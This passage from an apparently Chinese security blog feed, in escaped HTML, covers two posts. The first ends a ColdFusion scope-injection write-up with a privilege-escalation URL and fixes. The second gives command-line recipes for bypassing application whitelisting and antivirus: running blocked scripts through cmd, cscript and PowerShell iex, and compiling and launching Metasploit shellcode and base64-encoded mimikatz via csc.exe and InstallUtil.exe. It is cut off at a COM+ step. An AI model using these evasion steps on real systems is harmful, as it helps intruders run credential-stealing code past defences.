class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;pageScope&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atv&quot;&gt;structNew()&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;/&amp;gt;&lt;/span&gt;3. &lt;span class=&quot;tag&quot;&gt;&amp;lt;cfset&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;pageScope&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atv&quot;&gt;&quot;You are a regular user.&quot;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;/&amp;gt;&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;5. &lt;span class=&quot;com&quot;&gt;&amp;lt;!--- Make sure the user is not isAdmin ---&amp;gt;&lt;/span&gt;6. &lt;span class=&quot;tag&quot;&gt;&amp;lt;cfif&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;structKeyExists&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;, &lt;/span&gt;&lt;span class=&quot;atv&quot;&gt;&quot;isAdmin&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;gt;&lt;/span&gt;7. &lt;span class=&quot;tag&quot;&gt;&amp;lt;cfset&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;structDelete&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;, &lt;/span&gt;&lt;span class=&quot;atv&quot;&gt;&quot;isAdmin&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;/&amp;gt;&lt;/span&gt;8. &lt;span class=&quot;tag&quot;&gt;&amp;lt;/cfif&amp;gt;&lt;/span&gt;9. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;10. &lt;span class=&quot;com&quot;&gt;&amp;lt;!--- See if scope cascade finds this in the url scope ---&amp;gt;&lt;/span&gt;11. &lt;span class=&quot;tag&quot;&gt;&amp;lt;cftry&amp;gt;&lt;/span&gt;12. &lt;span class=&quot;tag&quot;&gt;&amp;lt;cfif&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;isAdmin&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;eq&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; 1&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;gt;&lt;/span&gt;13. &lt;span class=&quot;tag&quot;&gt;&amp;lt;cfset&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;pageScope&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atv&quot;&gt;&quot;You are an administrator due to scope shenanigans.&quot;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;/&amp;gt;&lt;/span&gt;14. &lt;span class=&quot;tag&quot;&gt;&amp;lt;/cfif&amp;gt;&lt;/span&gt;15. &lt;span class=&quot;tag&quot;&gt;&amp;lt;cfcatch&amp;gt;&lt;/span&gt;16. &lt;span class=&quot;com&quot;&gt;&amp;lt;!---&lt;/span&gt;17. &lt;span class=&quot;com&quot;&gt;The lookup for session.isAdmin was invalid.&lt;/span&gt;18. &lt;span class=&quot;com&quot;&gt;This is the behavior we would expect from a reasonable from a CFML engine.&lt;/span&gt;19. &lt;span class=&quot;com&quot;&gt;&amp;nbsp;---&amp;gt;&lt;/span&gt;20. &lt;span class=&quot;tag&quot;&gt;&amp;lt;/cfcatch&amp;gt;&lt;/span&gt;21. &lt;span class=&quot;tag&quot;&gt;&amp;lt;/cftry&amp;gt;&lt;/span&gt;22. &lt;span class=&quot;tag&quot;&gt;&amp;lt;/cfsilent&amp;gt;&lt;/span&gt; 发送请求： http://127.0.0.1:8500/scope-injection.cfm?session.isAdmin=1 &nbsp; 0x04 避免方案 1.变量初始化再使用 如上文提到代码，在Application.cfc中加入初始化： 1. &lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cffunction name&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;onSessionStart&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cfset session&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;isAdmin &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;3. &lt;span class=&quot;pun&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cffunction&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt; 当然了测试的时候不要忘记删除上边代码中的: 1. &lt;span class=&quot;pun&quot;&gt;&amp;lt;!---&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Make&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; sure the user is not isAdmin &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;---&amp;gt;&lt;/span&gt;2. &lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cfif structKeyExists&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;isAdmin&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&amp;gt;&lt;/span&gt;3. &lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cfset structDelete&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;isAdmin&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)/&amp;gt;&lt;/span&gt;4. &lt;span class=&quot;pun&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cfif&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt; &nbsp; 2.检测权限时候使用StructKeyExists检测变量是否存在 1. &lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cfif &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;StructKeyExists&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;isAdmin&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; AND session&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;isAdmin&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; admin stuff&lt;/span&gt;3. &lt;span class=&quot;pun&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cfif&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt; 修改上边代码测试 &nbsp; 测试结果 0x05 引用 http://www.petefreitag.com/item/834.cfm https://github.com/ecivis/miniapp http://www.ed2000.com/ShowFile.asp?FileID=175781 来自为知笔记(Wiz)]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[利用白名单应用绕过防护]]></title>
    <url>%2F2015%2F08%2F28%2Fe5-88-a9-e7-94-a8-e7-99-bd-e5-90-8d-e5-8d-95-e5-ba-94-e7-94-a8-e7-bb-95-e8-bf-87-e9-98-b2-e6-8a-a4%2F</url>
    <content type="text"><![CDATA[0x00 前言 看了subTee的在ShmooCon2015的PPT，学习到了很多关于应用白名单绕过的技巧，今天又看见了subTee开始写博客了，并且详细解释了关于应用白名单绕过的方法，于是结合自己测试与大家分享一下。 看完ppt其实作者是想告诉我们一种思想，我自己的理解是“利用信任程序执行恶意代码“。&lt;o:p&gt;&lt;/o:p&gt; 0x01 脚本执行&lt;o:p&gt;&lt;/o:p&gt; 当在一些情况下，比如限制了.bat|.vbs|.ps1脚本执行，我们可以通过以下方法绕过&lt;o:p&gt;&lt;/o:p&gt; 1. &lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;bat &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;cmd&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;k &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; script&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;txt&amp;nbsp;&lt;/span&gt;2. &lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;vbs&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;cscript&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;//E:vbscript script.txt&amp;nbsp; &lt;/span&gt;3. &lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;ps1&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Get&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Content&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; script&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;txt &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; iex&lt;/span&gt; &lt;o:p&gt;&lt;/o:p&gt; &nbsp;&lt;o:p&gt;&lt;/o:p&gt; &lt;o:p&gt;&lt;/o:p&gt; &nbsp;&lt;o:p&gt;&lt;/o:p&gt; &lt;o:p&gt;&lt;/o:p&gt; 测试的时候请注意编码这个坑，如果你自己新建一个文件手动写“netuser”到文件测试，你会发现不成功，所以请用echo。&lt;o:p&gt;&lt;/o:p&gt; &lt;o:p&gt;&lt;/o:p&gt; &nbsp;&lt;o:p&gt;&lt;/o:p&gt; 0x01 利用InstallUtil.exe执行程序&lt;o:p&gt;&lt;/o:p&gt; 有些时候搞站遇到不能执行exe，或者是杀毒软件太厉害，这个方法很好的绕过了检测。当然环境种必须是.net4.0以上。 1.直接用msf生成shellcode，执行shellcode&lt;o:p&gt;&lt;/o:p&gt; 1. &lt;span class=&quot;typ&quot;&gt;Step&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;One&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\Windows\Microsoft&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;NET\Framework64\v&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4.0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;30319&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\csc&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unsafe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;platform&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;x64 &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exeshell&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Shellcode&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cs&lt;/span&gt;3. &lt;span class=&quot;typ&quot;&gt;Step&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Two&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\Windows\Microsoft&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;NET\Framework64\v&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4.0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;30319&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\InstallUtil&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;logfile&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;LogToConsole&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;U exeshell&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe&lt;/span&gt; 当然了，如果你想第一步自己本地搞定，然后第二部再上传服务器执行也行。&lt;o:p&gt;&lt;/o:p&gt; &lt;o:p&gt;&lt;/o:p&gt; 2.直接执行pe文件（执行mimikatz）&lt;o:p&gt;&lt;/o:p&gt; 如果是pe文件，需要先把pe文件base64编码，有两种方法：&lt;o:p&gt;&lt;/o:p&gt; 1. &lt;span class=&quot;pun&quot;&gt;&amp;#42&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Base64&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Encode&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Mimikatz&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;In&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;PowerShell&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;$fileName &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;mimikatz.exe&quot;&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;$fileContent &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; get&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;content $fileName&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;$fileContentBytes &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Text&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;UTF8&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;GetBytes&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;$fileContent&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;$fileContentEncoded &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;ToBase64String&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;$fileContentBytes&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt;$fileContentEncoded &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;content &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;$fileName &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;.b64&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;7. &lt;span class=&quot;pun&quot;&gt;&amp;#42&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;OR&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;8. &lt;span class=&quot;pln&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;AsBytes&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;ReadAllBytes&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(@&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;C:\Tools\Mimikatz.exe&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;);&lt;/span&gt;9. &lt;span class=&quot;typ&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;AsBase64String&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;ToBase64String&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;AsBytes&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;);&lt;/span&gt;10. &lt;span class=&quot;typ&quot;&gt;StreamWriter&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; sw &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;StreamWriter&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(@&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;C:\Tools\Mimikatz.b64&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;);&lt;/span&gt;11. &lt;span class=&quot;pln&quot;&gt;sw&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Write&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;AsBase64String&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;);&lt;/span&gt;12. &lt;span class=&quot;pln&quot;&gt;sw&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;();&lt;/span&gt; 利用同上：&lt;o:p&gt;&lt;/o:p&gt; 1. &lt;span class=&quot;pln&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\Windows\Microsoft&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;NET\Framework64\v&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4.0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;30319&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\csc&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unsafe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;PELoader&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;PELoader&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cs&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\Windows\Microsoft&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;NET\Framework64\v&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4.0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;30319&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\InstallUtil&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;logfile&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;LogToConsole&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;U &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;PELoader&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe&lt;/span&gt; &nbsp;&lt;o:p&gt;&lt;/o:p&gt; &lt;o:p&gt;&lt;/o:p&gt; &nbsp;&lt;o:p&gt;&lt;/o:p&gt; 0x02 利用COM+应用&lt;o:p&gt;&lt;/o:p&gt; 把我们的恶意shellcode写入COM+应用中&lt;o:p&gt;&lt;/o:p&gt; 1. &lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span 